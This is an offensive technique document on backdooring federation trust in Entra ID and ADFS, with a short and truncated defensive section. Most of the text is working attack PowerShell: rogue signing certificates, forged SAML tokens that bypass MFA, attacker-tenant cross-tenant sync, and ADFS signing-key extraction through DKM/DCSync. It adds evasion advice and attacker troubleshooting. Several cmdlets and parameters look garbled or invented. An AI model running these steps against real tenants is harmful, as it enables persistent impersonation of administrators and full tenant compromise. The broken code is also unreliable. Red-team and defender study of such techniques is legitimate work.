# [PERSIST-TRUST-001]: Federation Trust Configuration Tampering

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-TRUST-001 |
| **MITRE ATT&CK v18.1** | [T1484.002 - Domain or Tenant Policy Modification: Trust Modification](https://attack.mitre.org/techniques/T1484/002/) |
| **Tactic** | Persistence, Defense Evasion, Privilege Escalation |
| **Platforms** | Hybrid AD, Entra ID, Cross-Cloud (AWS, GCP, Azure) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID versions with federation enabled; ADFS 2016-2019+ |
| **Patched In** | N/A |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Federation trust relationships allow organizations to delegate authentication from Entra ID to on-premises Active Directory Federation Services (AD FS) or external identity providers. An attacker with sufficient cloud tenant privileges (Global Administrator, Hybrid Identity Administrator, or Domain Administrator on ADFS) can manipulate federation trust configurations to add malicious signing certificates, modify claim issuance rules, or alter domain authentication methods. These backdoors allow attackers to forge SAML tokens, impersonate any user (including privileged accounts), and bypass MFA entirely. The attack persists indefinitely because the legitimate federation relationship provides plausible cover for the malicious configuration.

**Attack Surface:** Federation trust settings in Entra ID, ADFS claim issuance rules, ADFS certificate management, cross-tenant synchronization settings, and domain authentication status (Managed vs. Federated).

**Business Impact:** **Complete Tenant Compromise with Persistence**. An attacker can impersonate any user in the organization, including Global Administrators, without knowing passwords or bypassing MFA. They can maintain persistent access across cloud and hybrid environments indefinitely. The attack enables theft of sensitive data, lateral movement to partner tenants (via cross-tenant federation), and complete compromise of cloud services (M365, Azure, O365, etc.). Once established, the backdoor is difficult to detect without examining SAML token signatures and certificate metadata.

**Technical Context:** Federation trust attacks are particularly dangerous because they leverage legitimate authentication mechanisms. A single forged SAML token grants full access with no audit trail showing MFA bypass or abnormal authentication. The attack typically takes minutes to execute but enables months of undetected persistence. Detection likelihood is **Low to Medium** if SAML token signatures are not actively validated; most organizations lack the technical tools to detect forged tokens.

### Operational Risk

- **Execution Risk:** Low - Requires only administrative API access; no special exploits needed
- **Stealth:** Critical - Leverages legitimate SAML authentication flow, blending perfectly with normal federation traffic
- **Reversibility:** No - Requires full certificate rotation and trust reset; even then, leaves audit traces

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1, 2.2, 5.1 | Protect trust relationships; manage federation settings; enforce strong authentication |
| **DISA STIG** | U-15432 | Manage federation trust and identity provider configurations securely |
| **CISA SCuBA** | EXO.03.001 | Verify federated domain SAML signing certificates and revoke untrusted roots |
| **NIST 800-53** | AC-3, IA-5, SC-12 | Access Control; Identification and Authentication; Cryptographic Key Establishment |
| **GDPR** | Art. 32, Art. 5(1)(a) | Security of Processing; lawfulness, fairness, transparency |
| **DORA** | Art. 9, Art. 15 | Protection and Prevention; incident management and notification |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; identity and access management |
| **ISO 27001** | A.9.2.3, A.10.1.1, A.14.2.5 | Privileged access; data classification; cryptographic controls |
| **ISO 27005** | "Compromise of federation signing certificates" | Risk of unauthorized access across trust boundaries |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Global Administrator role in Entra ID, OR
- Hybrid Identity Administrator role, OR
- Domain Administrator role on AD FS server(s), OR
- Privileged access to ADFS certificate store

**Required Access:**
- Network access to Microsoft Entra admin portal or Microsoft Graph API
- For ADFS certificate extraction: Local admin on ADFS server or domain replication rights (DCSync)
- For cross-cloud federation: Admin access to both source and target identity tenants

**Supported Versions:**
- **Entra ID:** All versions
- **Active Directory Federation Services:** 2012 R2, 2016, 2019, 2022 (all versions supported)
- **Azure AD Connect:** 1.4.0+ (hybrid sync)
- **PowerShell:** PowerShell 5.0+, MSOL Module 1.1.183+

**Tools:**
- [Microsoft Entra admin center](https://entra.microsoft.com) (web UI)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)
- [Azure AD PowerShell Module (MSOL)](https://learn.microsoft.com/en-us/powershell/azure/active-directory/overview)
- [AADInternals PowerShell Module](https://github.com/Flangvik/AADInternals) - for certificate manipulation
- [ADFS Management Console](https://learn.microsoft.com/en-us/windows-server/identity/active-directory-federation-services-2016)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Adding a Malicious Secondary Federated Domain with Backdoor Certificate

**Supported Versions:** All Entra ID versions with federation enabled

#### Step 1: Enumerate Existing Federated Domains and Certificates

**Objective:** Identify current federation configuration and existing signing certificates to understand the legitimate setup.

**Command (via PowerShell):**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Domain.Read.All", "Organization.Read.All"

# Get all domains and their federation status
$domains = Get-MgDomain
$domains | Select-Object Id, IsVerified, IsDefault | Format-Table

# Get federation settings for federated domains
# Note: This requires Exchange Online cmdlets for detailed federation info
Connect-ExchangeOnline

# Enumerate federated domains and their SAML certificate fingerprints
$federatedDomains = Get-MsolFederationProperty -DomainName "contoso.com"
$federatedDomains | Select-Object FederationBrandName, FederationServiceIdentifier, LogOffUri
```

**Alternative (MSOL Module - Legacy but still effective):**

```powershell
# Connect to Azure AD via MSOL
Connect-MsolService

# List all domains in the tenant
$allDomains = Get-MsolDomain
$allDomains | Select-Object Name, Status, Authentication | Format-Table

# Get federation metadata for federated domains
$federatedDomains = $allDomains | Where-Object { $_.Authentication -eq "Federated" }
foreach ($domain in $federatedDomains) {
    Write-Output "Domain: $($domain.Name) - Type: $($domain.Authentication)"
    Get-MsolFederationProperty -DomainName $domain.Name | Select-Object FederationServiceIdentifier
}
```

**Expected Output:**
```
Name                           IsVerified IsDefault
----                           ---------- ---------
contoso.com                    True       True
contoso.onmicrosoft.com        True       False
partner.contoso.com            True       False

FederationBrandName       : Contoso ADFS
FederationServiceIdentifier : https://adfs.contoso.com/adfs/services/trust/
LogOffUri                  : https://adfs.contoso.com/adls/ls/?wa=wsignout1.0
```

**What This Means:**
- Primary domain (contoso.com) is federated and uses ADFS
- Federation service identifier points to the legitimate ADFS server
- Existing certificates and signing configuration can now be targeted for duplication

**OpSec & Evasion:**
- Perform enumeration from a device appearing to be a trusted IT admin machine
- Execute during normal business hours to blend with routine directory queries

---

#### Step 2: Generate a Malicious Self-Signed Certificate for Token Signing

**Objective:** Create a certificate that will be added as a secondary signing certificate to the existing federated domain, allowing token forgery.

**Command (PowerShell on Windows with elevated privileges):**

```powershell
# Import certificate generation module
Import-Module -Name 'C:\Program Files\Microsoft Azure AD Connect\Tools\ADFSToolsMicrosoft'

# Alternative: Generate certificate using OpenSSL or native Windows tools

# Generate self-signed certificate for token signing (valid for 1 year)
$certName = "Contoso Token Signing Cert 2025"
$cert = New-SelfSignedCertificate -DnsName "adfs.contoso.com" `
    -CertStoreLocation "Cert:\LocalMachine\My" `
    -NotAfter (Get-Date).AddYears(1) `
    -KeySpec Signature `
    -KeyLength 2048 `
    -Subject "CN=$certName"

Write-Output "Certificate created: $($cert.Thumbprint)"

# Export the certificate with private key (for attacker use)
$certPassword = ConvertTo-SecureString -String "AttackerPassword123!" -AsPlainText -Force
Export-PfxCertificate -Cert "Cert:\LocalMachine\My\$($cert.Thumbprint)" `
    -FilePath "C:\Temp\FakeADFSCert.pfx" `
    -Password $certPassword

# Export public key only (for Entra ID upload)
Export-Certificate -Cert "Cert:\LocalMachine\My\$($cert.Thumbprint)" `
    -FilePath "C:\Temp\FakeADFSCert.cer"

Write-Output "Certificate exported to C:\Temp\FakeADFSCert.pfx and C:\Temp\FakeADFSCert.cer"
```

**Alternative (Using OpenSSL - Cross-Platform):**

```bash
# Generate private key
openssl genrsa -out malicious-key.pem 2048

# Generate self-signed certificate (valid 365 days)
openssl req -new -x509 -key malicious-key.pem -out malicious-cert.pem -days 365 \
    -subj "/CN=adfs.contoso.com/O=Contoso/C=US"

# Convert to PKCS12 format (.pfx) for Windows compatibility
openssl pkcs12 -export -in malicious-cert.pem -inkey malicious-key.pem \
    -out malicious-cert.pfx -name "Contoso Token Signing" -password pass:AttackerPassword123!

ls -la malicious-cert.*
```

**Expected Output:**
```
Thumbprint                          Subject
----------                          -------
A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6    CN=Contoso Token Signing Cert 2025
```

**What This Means:**
- A valid cryptographic certificate has been created with a matching subject to the legitimate ADFS server
- The certificate is valid for 365 days, providing a long persistence window
- Both the private key (.pfx) and public key (.cer) are available for the attacker

**Troubleshooting:**
- **Error:** "Self-signed certificate creation requires administrative privileges"
  - **Cause:** PowerShell session lacks elevation
  - **Fix:** Run PowerShell as Administrator
- **Error:** "Certificate export failed - access denied"
  - **Cause:** User lacks permission to export private keys
  - **Fix:** Run as SYSTEM or Domain Admin account

**References & Proofs:**
- [AADInternals - Eight Ways to Compromise AD FS Certificates](https://aadinternals.com/talks/Eight%20ways%20to%20compromise%20AD%20FS%20certificates.pdf)
- [SolarWinds Compromise - APT29 Certificate Abuse](https://www.microsoft.com/en-us/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compr/)

---

#### Step 3: Add the Malicious Certificate as a Secondary Signing Certificate to Entra ID

**Objective:** Upload the malicious certificate to the federated domain, making Entra ID trust tokens signed by the attacker's certificate.

**Command (via PowerShell):**

```powershell
# Connect to Azure AD
Connect-MsolService

# Get the existing federation settings for the domain
$federationSettings = Get-MsolFederationProperty -DomainName "contoso.com"

# Read the malicious certificate
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$cert.Import((Get-Content "C:\Temp\FakeADFSCert.cer" -Encoding Byte))

# Create ImmutableId for the certificate (required by Entra ID)
$certBytes = $cert.RawData
$certBase64 = [System.Convert]::ToBase64String($certBytes)

# Add the malicious certificate as a secondary signing certificate
New-MsolFederationProperty -DomainName "contoso.com" `
    -FederationBrandName "Contoso ADFS" `
    -MetadataExchangeUri "https://adfs.contoso.com/federationmetadata/2007-06/federationmetadata.xml" `
    -SigningCertificate $cert `
    -IssuerUri "https://adfs.contoso.com/adfs/services/trust/" `
    -LogOffUri "https://adfs.contoso.com/adfs/ls/?wa=wsignout1.0" `
    -PassiveLogOnUri "https://adfs.contoso.com/adfs/ls/"

Write-Output "Malicious certificate added to federated domain contoso.com"

# Verify the certificate was added
$federationCerts = Get-MsolFederationProperty -DomainName "contoso.com" | Select-Object -ExpandProperty SigningCertificate
$federationCerts | Select-Object Thumbprint, Subject, NotAfter
```

**Alternative (Using Graph API):**

```powershell
# This method is more complex and requires beta Graph endpoints
# Recommended to use MSOL module above

# Connect to Graph
Connect-MgGraph -Scopes "Domain.ReadWrite.All", "Organization.ReadWrite.All"

# Get internalDomainFederation details
$domainId = (Get-MgDomain -DomainId "contoso.com").Id
$federationConfig = Get-MgBetaInternalDomainFederation -InternalDomainFederationId $domainId

# Add signing certificate (requires specific Graph beta endpoint)
# Implementation varies based on Graph API version
```

**Expected Output:**
```
Thumbprint                          Subject                              NotAfter
----------                          -------                              --------
ABC123DEF456GHI789JKL012MNO345PQR   CN=Contoso Token Signing Cert 2025   1/9/2026
```

**What This Means:**
- The malicious certificate is now recognized as a valid SAML signing certificate by Entra ID
- Any SAML token signed with the malicious certificate's private key will be accepted as legitimate
- The attacker can now forge tokens for any user without knowing their password or MFA status

**OpSec & Evasion:**
- Add the malicious certificate alongside legitimate certificates to avoid suspicion
- Choose a certificate subject name matching the legitimate ADFS server name
- Wait several hours before using the token forging capability to avoid immediate detection of cert creation and usage in same session

**References & Proofs:**
- [I SPy: Escalating to Entra ID Global Admin with a First-Party SPA](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)
- [Known Federated Domain Backdoor - Tenable](https://www.tenable.com/indicators/ioe/entra/KNOWN-FEDERATED-DOMAIN-BACKDOOR)

---

#### Step 4: Forge SAML Tokens to Impersonate Any User

**Objective:** Create forged SAML tokens signed with the malicious certificate to authenticate as any user, including Global Administrators.

**Command (PowerShell with AADInternals):**

```powershell
# Install/Import AADInternals
Import-Module AADInternals

# Load the malicious certificate (with private key)
$certPassword = ConvertTo-SecureString -String "AttackerPassword123!" -AsPlainText -Force
$cert = Get-PfxCertificate -FilePath "C:\Temp\FakeADFSCert.pfx" -Password $certPassword

# Get the target user's ImmutableId (for hybrid users synced to AD)
# This is the on-premises AD objectGUID
Connect-MsolService
$targetUser = Get-MsolUser -UserPrincipalName "admin@contoso.com"
$immutableId = $targetUser.ImmutableId

# Create a forged SAML token
$samlToken = New-AADIntSAMLToken `
    -IssuerUri "https://adfs.contoso.com/adfs/services/trust/" `
    -Audience "https://login.microsoftonline.com" `
    -NotBefore (Get-Date) `
    -NotAfter (Get-Date).AddHours(1) `
    -ImmutableId $immutableId `
    -Certificate $cert `
    -BypassMFA $true

Write-Output "Forged SAML token created for user: $($targetUser.UserPrincipalName)"
Write-Output "Token:"
Write-Output $samlToken

# Use the token to authenticate and obtain an Entra ID access token
$accessToken = Invoke-AADIntSAMLTokenExchange -SAMLToken $samlToken -Endpoint "https://login.microsoftonline.com"

Write-Output "Access token obtained:"
Write-Output $accessToken
```

**Alternative (Manual Token Forging with .NET):**

```powershell
# This approach allows for more control over SAML token claims

# Load necessary assemblies
[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null

# Define SAML token template
$samlTemplate = @"
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0" IssueInstant="TIME_PLACEHOLDER" ID="_GUID_PLACEHOLDER">
    <saml:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://adfs.contoso.com/adfs/services/trust/</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <!-- Signature will be added here -->
    </ds:Signature>
    <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin@contoso.com</saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml:SubjectConfirmationData NotOnOrAfter="NOTAFTER_PLACEHOLDER" Recipient="https://login.microsoftonline.com/saml2"/>
        </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="NOTBEFORE_PLACEHOLDER" NotOnOrAfter="NOTAFTER_PLACEHOLDER">
        <saml:AudienceRestriction>
            <saml:Audience>https://login.microsoftonline.com</saml:Audience>
        </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="TIME_PLACEHOLDER" SessionIndex="_SESSION_IDX">
        <saml:AuthnContext>
            <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
        </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
        <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
            <saml:AttributeValue>IMMUTABLEID_PLACEHOLDER</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>
"@

# Build token with placeholders replaced
$now = [DateTime]::UtcNow
$saml = $samlTemplate `
    -replace "TIME_PLACEHOLDER", $now.ToString("o") `
    -replace "NOTBEFORE_PLACEHOLDER", $now.ToString("o") `
    -replace "NOTAFTER_PLACEHOLDER", $now.AddHours(1).ToString("o") `
    -replace "GUID_PLACEHOLDER", [Guid]::NewGuid().ToString() `
    -replace "IMMUTABLEID_PLACEHOLDER", $immutableId

# Sign the assertion (requires .NET XML signing implementation)
# This is complex and requires proper implementation of DS:Signature
```

**Expected Output:**
```
Forged SAML token created for user: admin@contoso.com
Token:
<saml:Assertion ...>
    [Long base64-encoded token content]
</saml:Assertion>

Access token obtained:
eyJhbGciOiJSUzI1NiIsImtpZCI6Ik...
```

**What This Means:**
- A cryptographically valid SAML token has been forged, claiming to be from the legitimate ADFS server
- The token identifies the user as a Global Administrator
- Entra ID will accept this token without requiring MFA because the federated IdP (allegedly) enforced it
- The attacker now has full administrative access to the tenant

**Troubleshooting:**
- **Error:** "Certificate validation failed - private key not found"
  - **Cause:** PFX file does not contain private key or password is incorrect
  - **Fix:** Regenerate certificate with exportable private key; verify password
- **Error:** "Token validation failed - issuer mismatch"
  - **Cause:** Issuer URI in token doesn't match federated domain configuration
  - **Fix:** Verify exact issuer URI from `Get-MsolFederationProperty`

**References & Proofs:**
- [AADInternals GitHub](https://github.com/Flangvik/AADInternals)
- [Exploiting Certificate-Based Authentication in Entra ID - Semperis](https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/)
- [Forge Web Credentials: SAML Tokens - MITRE ATT&CK T1606.002](https://attack.mitre.org/techniques/T1606/002/)

---

### METHOD 2: Cross-Tenant Synchronization Backdoor (Cloud-to-Cloud Persistence)

**Supported Versions:** Entra ID with External Identities enabled

#### Step 1: Enumerate Cross-Tenant Access Settings

**Objective:** Identify existing cross-tenant synchronization configurations and trust relationships.

**Command (PowerShell):**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "CrossTenantUserProfileSharing.ReadWrite.All", "InvitationManagement.ReadWrite.All"

# Get cross-tenant access settings
$crossTenantSettings = Get-MgBetaCrossTenantAccessPolicy

# List all configured cross-tenant partners
$partners = Get-MgBetaCrossTenantAccessPolicyPartner
$partners | Select-Object TenantId, DisplayName | Format-Table

# Check inbound/outbound access policies
foreach ($partner in $partners) {
    Write-Output "Partner: $($partner.DisplayName) ($($partner.TenantId))"
    Get-MgBetaCrossTenantAccessPolicyPartnerInboundTrust -CrossTenantAccessPolicyPartnerId $partner.TenantId | Select-Object B2bDirectConnectAllowed, IsMfaRecognized
}
```

**Expected Output:**
```
TenantId                             DisplayName
--------                             -----------
a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d Trusted Partner Org

Partner: Trusted Partner Org (a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d)
B2bDirectConnectAllowed IsMfaRecognized
----------------------- ---------------
True                    True
```

**What This Means:**
- Cross-tenant synchronization is enabled and trusted partners can access resources
- The organization's trust settings allow automatic user invitation redemption
- An attacker-controlled tenant can be added as a partner

---

#### Step 2: Create an Attacker-Controlled Tenant as a Cross-Tenant Partner

**Objective:** Register the attacker's tenant as a legitimate cross-tenant partner, enabling automated user synchronization.

**Command (PowerShell - Execute in Compromised Tenant):**

```powershell
# In the COMPROMISED tenant (that the attacker has admin access to)

# Define the attacker-controlled tenant ID
$attackerTenantId = "x9y8z7a6-b5c4-d3e2-f1g0-h9i8j7k6l5m4"

# Create inbound cross-tenant partner configuration
$inboundConfig = @{
    TenantId = $attackerTenantId
    DisplayName = "Trusted Development Partner"
    B2bDirectConnectAllowed = $true
    Automatic UserInviteRedemption = $true
}

# Add the attacker tenant as a partner
New-MgBetaCrossTenantAccessPolicyPartner @inboundConfig

Write-Output "Attacker tenant added as cross-tenant partner: $attackerTenantId"

# Verify the partner was added
Get-MgBetaCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyPartnerId $attackerTenantId | Format-List
```

**Command (PowerShell - Configure Inbound Sync in Compromised Tenant):**

```powershell
# Enable automatic user invitation redemption for the attacker tenant
Update-MgBetaCrossTenantAccessPolicyPartnerInboundTrust `
    -CrossTenantAccessPolicyPartnerId $attackerTenantId `
    -IsMfaRecognized $true `
    -IsCompliantDeviceAccepted $true `
    -AutomaticUserConsentAllowed $true  # CRITICAL: Auto-redeem invitations

# Allow synchronization of users from attacker tenant into compromised tenant
$syncConfig = @{
    IsSyncAllowed = $true
    IsBlockedByResourceTenant = $false
}

Update-MgBetaCrossTenantAccessPolicyPartnerInboundSynchronization `
    -CrossTenantAccessPolicyPartnerId $attackerTenantId `
    -BodyParameter $syncConfig

Write-Output "Inbound synchronization enabled for attacker tenant"
```

**Expected Output:**
```
Attacker tenant added as cross-tenant partner: x9y8z7a6-b5c4-d3e2-f1g0-h9i8j7k6l5m4
Inbound synchronization enabled for attacker tenant
```

**What This Means:**
- The attacker's tenant is now registered as a trusted partner
- Any users created/invited from the attacker tenant will be automatically redeemed without requiring user consent
- Users from the attacker tenant can be synced into the compromised tenant, potentially including fake "admin" users
- The attacker can use these synchronized users to maintain persistent access

---

#### Step 3: Configure Outbound Sync from Attacker Tenant (Execute in Attacker Tenant)

**Objective:** Configure the attacker tenant to push accounts into the compromised tenant via cross-tenant synchronization.

**Command (PowerShell - Execute in Attacker Tenant):**

```powershell
# In the ATTACKER's tenant

$compromisedTenantId = "c1d2e3f4-a5b6-c7d8-e9f0-a1b2c3d4e5f6"

# Create outbound configuration pointing to the compromised tenant
$outboundConfig = @{
    TenantId = $compromisedTenantId
    DisplayName = "Target Customer Org"
    B2bDirectConnectAllowed = $true
    AutomaticUserInviteRedemption = $true
}

New-MgBetaCrossTenantAccessPolicyPartner @outboundConfig

# Enable outbound synchronization to push users to the compromised tenant
$outboundSync = @{
    IsSyncAllowed = $true
    IsSyncFromAADAllowed = $true
}

Update-MgBetaCrossTenantAccessPolicyPartnerOutboundSynchronization `
    -CrossTenantAccessPolicyPartnerId $compromisedTenantId `
    -BodyParameter $outboundSync

Write-Output "Outbound sync configured to push users to compromised tenant"
```

**What This Means:**
- The attacker tenant is configured to synchronize users into the compromised tenant
- Any user created in the attacker tenant will automatically be invited to the compromised tenant
- These users can be assigned roles in the compromised tenant, maintaining backdoor access
- The attacker can create "service accounts" or "contractor accounts" that persist indefinitely

**References & Proofs:**
- [Defend Against Azure Cross-Tenant Synchronization Attacks - CSA](https://cloudsecurityalliance.org/articles/defend-against-azure-cross-tenant-synchronization-attacks)
- [Compromising Identity Provider Federation - CrowdStrike](https://cloudsecurityalliance.org/articles/compromising-identity-provider-federation)

---

### METHOD 3: ADFS Token Signing Certificate Extraction and Abuse

**Supported Versions:** Hybrid AD with ADFS 2016-2022

#### Step 1: Extract ADFS Token Signing Certificate via Replication Service

**Objective:** Retrieve the legitimate ADFS token signing certificate to enable Golden SAML attacks without needing to upload a backdoor certificate.

**Command (PowerShell on ADFS Server or Domain Admin):**

```powershell
# This technique requires either:
# 1. Local admin on ADFS server, OR
# 2. Domain Admin with replication rights

# METHOD 1: Direct extraction from ADFS service (requires local admin on ADFS server)

# Connect to ADFS Management module
Import-Module ADFS

# Get the token signing certificate currently in use
$tokenSigningCerts = Get-ADFSCertificate -CertificateType Token-Signing

foreach ($cert in $tokenSigningCerts) {
    Write-Output "Certificate Thumbprint: $($cert.Thumbprint)"
    Write-Output "Certificate Subject: $($cert.Subject)"
    Write-Output "Not After: $($cert.NotAfter)"
    Write-Output "Is Primary: $($cert.IsPrimary)"
}

# Export the primary certificate (may not have private key if non-exportable)
$primaryCert = $tokenSigningCerts | Where-Object { $_.IsPrimary -eq $true } | Select-Object -First 1

# METHOD 2: Extract via ADFS Configuration Database (requires local admin on ADFS or SQL admin)

# Access the ADFS configuration database
$configDb = Get-ADFSProperties | Select-Object CertificateThumbprint
$primaryThumbprint = $configDb.CertificateThumbprint

# Retrieve from local certificate store
$cert = Get-Item "Cert:\LocalMachine\My\$primaryThumbprint"

# Export public key
Export-Certificate -Cert $cert -FilePath "C:\Temp\ADFSTokenSigningCert.cer"

# If the private key is exportable, extract it
# Note: This may fail if the key is non-exportable or stored in CAPI2
try {
    Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\ADFSTokenSigningCert.pfx" -Password (ConvertTo-SecureString -String "Password" -AsPlainText -Force)
    Write-Output "Successfully exported certificate with private key"
} catch {
    Write-Output "Private key is not exportable. Attempting alternative extraction..."
}
```

**Alternative (Via ADFS Replication Service - Remote Extraction):**

```powershell
# This technique abuses the AD FS Policy Store Transfer Service
# Requires network access to ADFS port (default: HTTP/HTTPS)
# Requires local admin on ADFS server or domain replication rights

# This is a complex technique requiring .NET reflection or tools like AADInternals

# Using AADInternals
Import-Module AADInternals

# Extract ADFS configuration via replication service
$adfsConfig = Get-AADIntADFSConfiguration -Server "adfs.contoso.com" -Credentials $creds

# The configuration includes encrypted token signing certificate
$encryptedCert = $adfsConfig.TokenSigningCertificate

# Decrypt using DKM key from Active Directory (requires DCSync privileges)
$dkmKey = Get-AADIntDCKey -DomainController "dc.contoso.com"
$decryptedCert = Unprotect-AADIntADFSCertificate -EncryptedCert $encryptedCert -DKMKey $dkmKey

Write-Output "ADFS Token Signing Certificate extracted and decrypted"
```

**Expected Output:**
```
Certificate Thumbprint: ABC123DEF456GHI789JKL012MNO345PQR
Certificate Subject: CN=ADFS Signing - adfs.contoso.com
Not After: 1/15/2026
Is Primary: True

Successfully exported certificate with private key
```

**What This Means:**
- The legitimate ADFS token signing certificate has been extracted
- The attacker now has the private key, allowing them to forge SAML tokens without adding a backdoor certificate
- Using the legitimate certificate is stealthier than adding a malicious one (no new certificate in audit logs)
- This persists as long as the certificate is valid (typically years)

**Troubleshooting:**
- **Error:** "Access denied - cannot access ADFS service"
  - **Cause:** Not running as ADFS service account or local admin
  - **Fix:** Execute with elevated privileges or service account credentials
- **Error:** "Private key is not exportable"
  - **Cause:** Key is stored in CNG/CAPI2 with non-exportable flag
  - **Fix:** Use DCSync + DKM decryption method instead

**References & Proofs:**
- [Abusing AD FS Replication - Google Cloud Blog](https://cloud.google.com/blog/topics/threat-intelligence/abusing-replication-stealing-adfs-secrets-over-the-network/)
- [Eight Ways to Compromise AD FS Certificates - Dirk-jan Mollema / AADInternals](https://aadinternals.com/talks/Eight%20ways%20to%20compromise%20AD%20FS%20certificates.pdf)

---

## 4. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Strict Federated Domain Certificate Management and Monitoring**

Continuously audit all federation signing certificates and immediately alert on any certificate additions or modifications.

**Manual Steps (Entra ID Portal):**

1. Navigate to **Entra ID** → **Custom domain names**
2. For each federated domain, click on the domain name
3. Under **Federated domain settings**, review all listed signing certificates
4. Verify that each certificate's subject matches the expected ADFS server name
5. Check the **Certificate thumbprint** and **Not After** date
6. Document all certificates and their details in a compliance register
7. Set calendar reminders for certificate expiration dates (90 days before expiry)
8. Any unexpected certificates = Immediate incident response

**PowerShell (Continuous Audit):**

```powershell
# Audit federation certificates weekly
$federatedDomains = (Get-MsolDomain | Where-Object { $_.Authentication -eq "Federated" }).Name

$certAudit = @()

foreach ($domain in $federatedDomains) {
    $fedProperty = Get-MsolFederationProperty -DomainName $domain
    
    # Get all signing certificates (not just primary)
    $certs = $fedProperty.SigningCertificate
    
    foreach ($cert in $certs) {
        $daysUntilExpiry = ($cert.NotAfter - (Get-Date)).Days
        
        # Alert if certificate is new (created within last 7 days)
        $certAge = (Get-Date) - $cert.NotBefore
        
        if ($certAge.Days -lt 7) {
            Write-Warning "NEW CERTIFICATE DETECTED on domain $domain"
            Write-Warning "Thumbprint: $($cert.Thumbprint)"
            Write-Warning "Subject: $($cert.Subject)"
            Write-Warning "Created: $($cert.NotBefore)"
            Write-Warning "INVESTIGATE IMMEDIATELY"
        }
        
        $auditEntry = [PSCustomObject]@{
            Domain = $domain
            Thumbprint = $cert.Thumbprint
            Subject = $cert.Subject
            NotBefore = $cert.NotBefore
            NotAfter = $cert.NotAfter
            DaysUntilExpiry = $daysUntilExpiry
            IssuedToDays = $certAge.Days
        }
        
        $certAudit += $auditEntry
    }
}

# Export audit report
$certAudit | Export-Csv -Path "C:\Reports\FederationCertAudit_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation

# Alert on suspicious findings
if ($certAudit | Where-Object { $_.IssuedToDays -lt 7 -or $_.DaysUntilExpiry -lt 30 }) {
    Write-Warning "CRITICAL: Suspicious certificate activity or expiring certificates detected"
}
```

**What to Look For:**
- Certificates with recent NotBefore dates (created within last 7 days without authorization)
- Certificates with subject names not matching legitimate ADFS servers
- Self-signed certificates added to federated domains
- Certificates from unknown CAs
- Multiple secondary certificates on a single domain

**Apply To:** All federated domains weekly/monthly

---

**2. Enforce Federation Certificate Pinning and Validation**

Restrict Entra ID to only accept SAML tokens signed by a whitelist of approved certificates, preventing attacker-controlled certificates.

**Manual Steps (PowerShell - Remove Unnecessary Certs):**

```powershell
# For each federated domain, ensure ONLY the primary legitimate certificate is authorized

$federatedDomains = (Get-MsolDomain | Where-Object { $_.Authentication -eq "Federated" }).Name

foreach ($domain in $federatedDomains) {
    $fedProperty = Get-MsolFederationProperty -DomainName $domain
    
    # Get primary certificate (the one that should be used)
    $primaryCert = $fedProperty.SigningCertificate | Where-Object { $_.IsPrimary -eq $true }
    
    # Get secondary/backup certificates
    $secondaryCerts = $fedProperty.SigningCertificate | Where-Object { $_.IsPrimary -ne $true }
    
    if ($secondaryCerts) {
        Write-Warning "Domain $domain has $($secondaryCerts.Count) secondary certificates"
        
        foreach ($cert in $secondaryCerts) {
            # Investigate each secondary certificate
            Write-Output "Secondary cert - Thumbprint: $($cert.Thumbprint), Subject: $($cert.Subject), NotAfter: $($cert.NotAfter)"
            
            # If not needed, remove via Update-MsolFederatedDomain cmdlet
            # This requires careful coordination to avoid breaking authentication
        }
    }
}
```

**What to Look For:**
- Any secondary or backup certificates that are not documented as legitimate
- Certificates approaching expiration without a replacement in place
- Certificates with very long validity periods (> 5 years)

**Apply To:** All federated domains immediately upon detection of unauthorized certificates

---

**3. Require Explicit MFA Enforcement for Federated Users (Do Not Trust IdP)**

Configure Entra ID to enforce MFA regardless of claims from the federated IdP, preventing MFA bypass via forged tokens.

**Manual Steps (Azure Portal):**

1. Navigate to **Protection** → **Conditional Access** → **Policies**
2. Click **+ New policy**
3. **Name:** "Enforce MFA for Federated Users"
4. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** All cloud apps
5. **Conditions:**
   - **Authentication method:** Select "Federated users"
6. **Access controls:**
